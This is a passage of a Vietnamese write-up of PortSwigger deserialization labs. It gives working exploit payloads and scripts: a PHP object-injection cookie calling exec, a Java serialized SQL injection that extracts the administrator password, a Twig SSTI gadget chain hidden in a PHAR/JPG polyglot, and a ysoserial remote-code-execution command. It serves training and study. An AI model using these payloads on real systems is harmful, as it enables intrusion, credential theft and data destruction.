data_cookies = 'O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}'
encode_base64 = base64.b64encode(data_cookies.encode('utf-8')).decode('utf-8')
encode_url = quote(encode_base64)
solve = encode_url

cookies = {
    'session': solve,
}

# dùng cookie đã sử lý để xóa file của carlos
response = requests.get(
    url + '/product?productId=1',
    cookies=cookies,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/H1cRIp_Kp.png)

mục đích của chúng ta đã hoàn thành và chúng ta cũng đã giải quyết được bài lab

![image](https://hackmd.io/_uploads/S1YuUTdF6.png)

## 6.Lab: Developing a custom gadget chain for Java deserialization

link: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization

### Đề bài

![image](https://hackmd.io/_uploads/ry-Ea_ejp.png)

### Phân tích

- Lab này sử dụng cơ chế phiên dựa trên tuần tự hóa. Nếu bạn có thể xây dựng một chuỗi tiện ích phù hợp, bạn có thể khai thác quá trình khử tuần tự không an toàn của phòng thí nghiệm này để lấy mật khẩu của quản trị viên. Để giải quyết bài thí nghiệm, hãy giành quyền truy cập vào mã nguồn và sử dụng nó để xây dựng chuỗi tiện ích nhằm lấy mật khẩu của quản trị viên. Sau đó, đăng nhập với tư cách quản trị viên và xóa carlos. Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: wiener:peter

- Ứng dụng sử dụng Java binary serialization format tại session cookie.

mình đăng nhập tài khoản wiener:peter và theo dõi session

![image](https://hackmd.io/_uploads/HJdwCOgjT.png)

Sau khi đăng nhập, session người dùng có dấu hiệu của Deserialize

![image](https://hackmd.io/_uploads/HywlJFxoa.png)

Đọc source HTML thì chứa đường dẫn đến 1 folder backup.

![image](https://hackmd.io/_uploads/S16SktxiT.png)

Truy cập chúng ta thu được tệp AccessTokenUser.java định nghĩa lớp AccessTokenUser() có hai thuộc tính username và accessToken. Lưu ý rằng phương thức này cho phép Deserialize:

![image](https://hackmd.io/_uploads/r1nwJYlo6.png)

Còn một thông tin dễ dàng bị bỏ qua, đó là file AccessTokenUser.java nằm trong thư mục /backup, nên có thể thử truy cập tới thư mục này, thu được kết quả thư mục này chứa một file khác ProductTemplate.java:

![image](https://hackmd.io/_uploads/rye5aJYgia.png)

Truy cập tới /backup/ProductTemplate.java, mã nguồn:

```java!
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}

```

Tệp ProductTemplate.java nằm trong package data.productcatalog, định nghĩa lớp ProductTemplate() cho phép Deserialize, với các thuộc tính private id, product. Phương thức readObject() được ghi đè. Chúng ta có thể dự đoán trang web sử dụng hệ cở sở dữ liệu PostgresSQL

Chú ý biến sql sử dụng phương thức String.format() ẩn chứa lỗ hổng SQL injection.

```sql!
String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
```

Và giá trị biến id có thể được thay đổi:

```java!
public ProductTemplate(String id) {
    this.id = id;
}
```

Vì lớp ProductTemplate() cho phép Deserialize nên chúng ta có ý tưởng như sau: Tạo một đối tượng productTemplate thuộc lớp ProductTemplate, thay đổi thuộc tính id của đối tượng này thành payload nhằm khai thác lỗ hổng SQL injection. Serialize đối tượng productTemplate và thay giá trị vào session của người dùng. Khi trang web thực hiện Deserialize session này sẽ thực thi câu truy vấn đã bị chúng ta thay đổi.

- Dựa vào đó ta sẽ tạo 1 ProductTemplate serialized object chứa tham số id là SQLi payload

### Khai thác

- Đầu tiên, tạo một package với tên data.productcatalog, các file java của chúng ta sẽ đặt trong package này, vì nếu không tạo package hoặc đặt tên sai sẽ dẫn tới lỗi package không tồn tại.
- Ta sẽ tạo các file theo cấu trúc như sau:

![image](https://hackmd.io/_uploads/BJCKBYxoT.png)

- với source class Main: chúng ta sử dụng file này tạo payload. Gồm
  - một hàm thực hiện Serialize
  - Một hàm thực hiện đọc dữ liệu kết quả Serialize, sau đó sử dụng mã hóa Base64 và mã hóa URL cho ra payload cuối cùng. Do dữ liệu cần đọc ở dạng bytes nên chúng ta dùng phương thức Files.readAllBytes()

```java!
package data.productcatalog;

import java.io.*;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.util.Base64;

public class Main {
    public static void main(String[] args) throws IOException {
        ProductTemplate productTemplate = new ProductTemplate("' UNION SELECT NULL--");
        Ser(productTemplate);
        ReadAndOut();
    }
    public static void Ser(Object obj) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("test.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
    }
    public static void ReadAndOut() throws IOException {
        File file = new File("test.txt");
        byte[] bytes = Files.readAllBytes(file.toPath());
        String output = Base64.getEncoder().encodeToString(bytes);
        output = URLEncoder.encode(output, "UTF-8");
        System.out.println(output);
    }
}
```

- với source class ProductTemplate: Chúng ta cần sử dụng tới lớp ProductTemplate, tạo file ProductTemplate.java

```javas!
package data.productcatalog;

import java.io.Serializable;

public class ProductTemplate implements Serializable {
    static final long serialVersionUID = 1L;
    private final String id;
    public ProductTemplate(String id) {
        this.id = id;
    }
}
```

Lúc này, bài lab trở về dạng bài khai thác lỗ hổng SQL injection. Trước hết chúng ta xác nhận số lượng cột bằng error-based UNION attack.

- gửi payload: `' UNION SELECT NULL--`

![image](https://hackmd.io/_uploads/BkFrOFeip.png)

lỗi xuất hiện cho thấy câu truy vấn không đúng số cột, đây là lỗi chúng ta mong muốn thu được, chứng tỏ câu truy vấn đang "hoạt động tốt":

![image](https://hackmd.io/_uploads/rJkpIFgsa.png)

Tiếp tục thử với payload`' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--`chúng ta thu được câu truy vấn cần có 8 cột:

![image](https://hackmd.io/_uploads/ByWivtej6.png)

![image](https://hackmd.io/_uploads/SJb1dKgoa.png)

Tiếp theo, kiểm tra kiểu dữ liệu của các cột có tương thích với string hay không và cột nào có thể hiển thị dữ liệu, payload:

```sql!
' UNION SELECT 'column1', 'column2', 'column3', 'column4', 'column5', 'column6', 'column7', 'column8'--
```

![image](https://hackmd.io/_uploads/S16kFYeia.png)

- Như vậy chúng ta có thể khai thác dữ liệu từ cột thứ 4, và dữ liệu hiển thị phải ở dạng số (numberic). Chúng ta có thể sử dụng hàm CAST() để chuyển đổi.

![image](https://hackmd.io/_uploads/ByQ4KYxj6.png)

- Ta đi xác định tên table bằng payload:

```sql!
' UNION SELECT NULL, NULL, NULL, CAST(table_name AS INTEGER), NULL, NULL, NULL, NULL FROM information_schema.tables --
```

![image](https://hackmd.io/_uploads/SJIy5Yxi6.png)

![image](https://hackmd.io/_uploads/B1_Z5Yej6.png)

Thu được tên bảng users, tiếp tục tìm kiếm tên cột, payload:

```sql!
' UNION SELECT NULL,NULL,NULL,CAST(column_name AS numeric),NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name = 'users'--
```

![image](https://hackmd.io/_uploads/HyQccYgip.png)

![image](https://hackmd.io/_uploads/BJZd9tlsa.png)

Thu được một cột có tên username, tìm kiếm tên cột khác username, payload:

```sql!
' UNION SELECT NULL, NULL, NULL, CAST(column_name AS INTEGER), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' AND column_name NOT IN ('username')--
```

![image](https://hackmd.io/_uploads/ByDkjYxo6.png)

Thu được cột có tên password. Tìm kiếm giá trị username, payload:

```sqp!
' UNION SELECT NULL, NULL, NULL, CAST(username || '~' || password AS INTEGER), NULL, NULL, NULL, NULL FROM users --
```

mình thực hiện nối chuỗi khi thi kết quả username và password từ bảng users

![image](https://hackmd.io/_uploads/ry1xnKeop.png)

- được

```!
rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAcycgVU5JT04gU0VMRUNUIE5VTEwsIE5VTEwsIE5VTEwsIENBU1QodXNlcm5hbWUgfHwgJ34nIHx8IHBhc3N3b3JkIEFTIElOVEVHRVIpLCBOVUxMLCBOVUxMLCBOVUxMLCBOVUxMIEZST00gdXNlcnMgLS0%3D
```

![image](https://hackmd.io/_uploads/SkZk3tgj6.png)

Đăng nhập bằng tài khoản **administrator~vkjb41pn5ustgu0pc9ld** tìm được và xóa user carlos để solve challenge.

![image](https://hackmd.io/_uploads/SktinKlop.png)

![image](https://hackmd.io/_uploads/By7hhKlsp.png)

mình đã viết srcipt khai thác

```python!
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0ae0004d04a306e580e085c100660017.web-security-academy.net'

session = requests.Session()

data_login = {
    'username' : 'wiener',
    'password' : 'peter',
}
response = session.post(
    url + "/login",
    data=data_login,
    verify=False,
)

payload = 'rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAcycgVU5JT04gU0VMRUNUIE5VTEwsIE5VTEwsIE5VTEwsIENBU1QodXNlcm5hbWUgfHwgJ34nIHx8IHBhc3N3b3JkIEFTIElOVEVHRVIpLCBOVUxMLCBOVUxMLCBOVUxMLCBOVUxMIEZST00gdXNlcnMgLS0%3D'
cookies = {
    'session' : payload,
}
response = session.get(
    url,
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
pattern = r"administrator~\w{20}"
match = re.search(pattern, response.text)
account = match.group()
username = account.split('~')[0]
password = account.split('~')[1]
print("tên dăng nhập là: ", username)
print("mật khẩu là: ", password)

data= {
    'username' : username,
    'password' : password,
}
response = session.post(
    url + "/login",
    data=data,
    verify=False,
)

response = session.get(
    url + "/admin/delete?username=carlos",
    verify=False,
)
soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/Bk9dZ5lsp.png)

![image](https://hackmd.io/_uploads/BkAL-5ljT.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/HJxR2Kxj6.png)

## 7. Lab: Using PHAR deserialization to deploy a custom gadget chain

link: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain

### Đề bài

![image](https://hackmd.io/_uploads/rya5F3lo6.png)

### Phân tích

- Phòng thí nghiệm này không sử dụng quá trình khử lưu huỳnh một cách rõ ràng. Tuy nhiên, nếu bạn kết hợp PHARquá trình khử tuần tự hóa với các kỹ thuật hack nâng cao khác, bạn vẫn có thể thực thi mã từ xa thông qua chuỗi tiện ích tùy chỉnh.
- Để giải quyết bài thí nghiệm, hãy xóa morale.txttệp khỏi thư mục chính của Carlos.
- Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`

- Ứng dụng có chức năng cho user upload avatar, tuy nhiên chỉ ở định dạng jpg.

![image](https://hackmd.io/_uploads/r1jaoheoa.png)

- Upload thử file jpg và thấy đường dẫn xem avatar tại /cgi-bin/avatar.php?avatar=username.

![image](https://hackmd.io/_uploads/SJo-h2ei6.png)

Thử truy cập folder /cgi-bin thì thấy có 2 file mã nguồn định nghĩa 2 class CustomTemplate và Blog và file backup.

![image](https://hackmd.io/_uploads/SkW8nneoT.png)

- Truy cập /cgi-bin/Blog.php~ và ta xem được source code.

```php!
<?php
require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}
?>
```

- Để ý qua một chút thì thấy server bị dính lỗi SSTI với template engine Twig ở $this->desc tại hàm **wakeup(). Như vậy ta có thể thấy được sink để rce tại đây bằng cách nhét SSTI payload vào $this->desc. Và để trigger được nó thì cần gọi hàm **toString() để render trang index.php chứa payload vừa được set ở hàm \_\_wakeup(). (1)

Ngoài ra ta còn xem được source code của CustomTemplate.php:

![image](https://hackmd.io/_uploads/B1Pc03xs6.png)

```php!
<?php
class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    private function isTemplateLocked() {
        return file_exists($this->lockFilePath());
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lockFilePath(), "") === false) {
                throw new Exception("Could not write to " . $this->lockFilePath());
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}
?>
```

Mã nguồn có magic method **destruct() sẽ thực hiện gọi hàm lockFilePath() để lấy tên file trước khi unlink(). Tuy nhiên nếu chú ý kĩ, nếu $this->template_file_path là 1 instance của class Blog thì **toString() của Blog sẽ được trigger. (2)

### Khai thác

Kết hợp (1) và (2), ta tạo 1 CustomTemplate object với thuộc tính template_file_path là 1 instance Blog. Trong đó, $blog->desc sẽ là SSTI payload để xóa file morale.txt.

```php!
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}";
$blog->user = 'user';
$object->template_file_path = $blog;
```

Và vì server chỉ chấp jpg, nên ta sử dụng phương pháp phar jpg polygot với script như sau (Nguồn https://github.com/kunte0/phar-jpg-polyglot):

```php!
<?php


function generate_base_phar($o, $prefix)
{
    global $tempname;
    @unlink($tempname);
    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->addFromString("test.txt", "test");
    $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($o);
    $phar->stopBuffering();

    $basecontent = file_get_contents($tempname);
    @unlink($tempname);
    return $basecontent;
}

function generate_polyglot($phar, $jpeg)
{
    $phar = substr($phar, 6); // remove <?php dosent work with prefix
    $len = strlen($phar) + 2; // fixed
    $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
    $contents = substr($new, 0, 148) . "        " . substr($new, 156);

    // calc tar checksum
    $chksum = 0;
    for ($i = 0; $i < 512; $i++) {
        $chksum += ord(substr($contents, $i, 1));
    }
    // embed checksum
    $oct = sprintf("%07o", $chksum);
    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
    return $contents;
}


// // pop exploit class
// class PHPObjectInjection
// {
// }
// $object = new PHPObjectInjection;
// $object->inject = 'system("id");';
// $object->out = 'Hallo World';
class CustomTemplate
{
}
class Blog
{
}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}";
$blog->user = 'user';
$object->template_file_path = $blog;


// config for jpg
$tempname = 'temp.tar.phar'; // make it tar
$jpeg = file_get_contents('in.jpg');
$outfile = 'out.jpg';
$payload = $object;
$prefix = '';

var_dump(serialize($object));


// make jpg
file_put_contents($outfile, generate_polyglot(generate_base_phar($payload, $prefix), $jpeg));

/*
// config for gif
$prefix = "\x47\x49\x46\x38\x39\x61" . "\x2c\x01\x2c\x01"; // gif header, size 300 x 300
$tempname = 'temp.phar'; // make it phar
$outfile = 'out.gif';

// make gif
file_put_contents($outfile, generate_base_phar($payload, $prefix));

*/
```

![image](https://hackmd.io/_uploads/HyTNdTgip.png)

và mình được ảnh chứa đối tượng của chúng ta

![out](https://hackmd.io/_uploads/SygZYTxip.jpg)

Upload file và trigger Phar deserialization tại tham số avatar bằng `phar://`.

![image](https://hackmd.io/_uploads/HyA75TgjT.png)

![image](https://hackmd.io/_uploads/B1bm5axsa.png)

mục đích của chúng ta đã hoàn thành và mình cũng giải được bài lab này

![image](https://hackmd.io/_uploads/B1IN9aesp.png)

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">

## Tìm hiểu

### Lỗ hổng deserialization trong ngôn ngữ PHP

- Trong ngôn ngữ PHP sử dụng hàm serialize() thực hiện serialize đối tượng. Xem ví dụ sau:

```php!
<?php
    class Person {
        public $name = "Tom";
        private $age = 18;
        protected $sex = "male";
        public function hello() {
            echo "hello";
        }
    }
    $example = new Person();
    $example_ser = serialize($example);
    echo $example_ser;
```

Lớp Person() gồm ba biến với các thuộc tính public, private, protected và hàm hello(). Kết quả sau khi thực hiện serialize biến $example:

```php!
O:6:"Person":3:{s:4:"name";s:3:"Tom";s:11:"Personage";i:18;s:6:"*sex";s:4:"male";}
```

các bạn có để ý rằng các nhóm s:11:"Personage" và s:6:"_sex" có chút khác biệt không? Tại sao tên biến lại có thêm phần Person hay ký tự _, hoặc số lượng ký tự Personage là 9 nhưng kết quả lại hiển thị 11?

![image](https://hackmd.io/_uploads/SkL3TdJoa.png)

Hãy bình tĩnh, thực chất điều này là do với mỗi phạm vi truy cập thì quy ước cách hiển thị của chúng khác nhau:

- **public**: không thay đổi.
- **private**: Có thêm các ký tự NULL, với định dạng: `%00` + tên Object + `%00` + tên thuộc tính
- **protected**: Có định dạng: `%00` + `*` + `%00` + tên thuộc tính.

Có thể sử dụng hàm urlencode() để thấy rõ hơn:

![image](https://hackmd.io/_uploads/HktOCOyip.png)

#### Magic methods trong PHP

- **\_\_construct()**: được sử dụng để khởi tạo một đối tượng. Phương thức này được gọi tự động ngay khi một đối tượng được tạo ra bằng từ khóa new. Ví dụ:

```php!
class Person {
    public $name;
    public function __construct($name) {
        $this->name = $name;
        echo "My name is $this->name";
    }
}

$person = new Person("cuong");
```

![image](https://hackmd.io/_uploads/SJ8HwYyo6.png)

- **\_\_destruct()**: Được sử dụng để xử lý các tác vụ cuối cùng trước khi một đối tượng bị hủy. Phương thức destruct() sẽ được tự động gọi khi một đối tượng của một lớp bị hủy hoặc giải phóng bộ nhớ. Ví dụ:

```php!
class Person {
    public $name;
    public function __construct($name) {
        $this->name = $name;
    }
    public function __destruct() {
        echo "function __destruct() is executed";
    }
}

$person = new Person("cuong");
echo "program running\n";
```

![image](https://hackmd.io/_uploads/H13FvY1s6.png)

- **\_\_toString()**: Khi một đối tượng được gọi hoặc sử dụng dưới vai trò là chuỗi (string), phương thức \_\_toString() sẽ được thực thi. Lưu ý rằng method này luôn phải return một chuỗi.

```php!
class Person
{
    public $name;
    public $age;
    public function __construct($name, $age)
    {
        $this->name = $name;
        $this->age = $age;
    }
    public function __toString()
    {
        return "function __toString() is executed";
    }
}

$person = new Person("John", 25);
echo $person;
```

![image](https://hackmd.io/_uploads/rJBxdtJjT.png)

- **\_\_sleep()**: Khi một đối tượng được serialize thành một chuỗi, tất cả các thuộc tính của đối tượng sẽ được lưu trữ. Tuy nhiên, trong trường hợp chúng ta muốn loại bỏ một số thuộc tính để giảm kích thước output hoặc bảo vệ thông tin private của đối tượng, phương thức sleep() sẽ được sử dụng để giải quyết vấn đề này. Điểu chúng ta cần chú ý là phương thức \_\_sleep() sẽ được gọi trước khi thực hiện quá trình serialization. Ví dụ:

```php!
class Person {
    public $name;
    public function __construct($name) {
        $this->name = $name;
    }
    public function __sleep() {
        echo "function __sleep() is executed before serialize";
        return array();
    }
}

$person = new Person("cuong");
echo "Preparing for serialization ...\n";
serialize($person);
echo "\nSerialization done";
```

![image](https://hackmd.io/_uploads/H1OgFtksp.png)

- **\_\_wakeup()**: Khi một đối tượng được unserialize từ một chuỗi, tất cả các thuộc tính của đối tượng sẽ được khôi phục. Tuy nhiên, trong trường hợp chúng ta muốn kiểm soát quá trình khôi phục các thuộc tính của đối tượng để đảm bảo tính toàn vẹn, có thể sử dụng phương thức wakeup(). Điểu chúng ta cần chú ý là phương thức \_\_wakeup() sẽ được gọi trước khi thực hiện quá trình deserialization. Ví dụ:

```php!
class Person
{
    public $name;
    public function __construct($name)
    {
        $this->name = $name;
    }
    public function __wakeup()
    {
        echo "function __wakeup() is executed before deserialize";
        return array();
    }
}

$person = new Person("cuong");
$ser = serialize($person);
echo "Preparing for deserialization ...\n";
unserialize($ser);
echo "\nDeserialization done";
```

![image](https://hackmd.io/_uploads/B1lJ9KJjp.png)

## 8. Lab: Exploiting Java deserialization with Apache Commons

### Đề bài

![image](https://hackmd.io/_uploads/BJ4CfDP7Jl.png)

### Phân tích

- Phòng thí nghiệm này sử dụng cơ chế phiên dựa trên tuần tự hóa và tải thư viện Apache Commons Collections. Mặc dù bạn không có quyền truy cập mã nguồn, bạn vẫn có thể khai thác phòng thí nghiệm này bằng cách sử dụng các chuỗi tiện ích được xây dựng sẵn.

Để giải quyết phòng thí nghiệm, hãy sử dụng công cụ của bên thứ ba để tạo đối tượng tuần tự hóa độc hại chứa tải trọng thực thi mã từ xa. Sau đó, chuyển đối tượng này vào trang web để xóa tệp morale.txtkhỏi thư mục gốc của Carlos.

Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau:wiener:peter

### Khai thác

- vào môi trường lab của CBJS chạy lệnh

```java
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```

![image](https://hackmd.io/_uploads/SJxGXvD71g.png)

- copy payload vào session

![image](https://hackmd.io/_uploads/SJYd7vPQkl.png)

- thấy server xử lý lỗi
- encode toàn bộ payload bằng URL encode

![image](https://hackmd.io/_uploads/ryXjQvPX1e.png)

- gửi request và solve được lab

![image](https://hackmd.io/_uploads/HyBJVDv7yl.png)
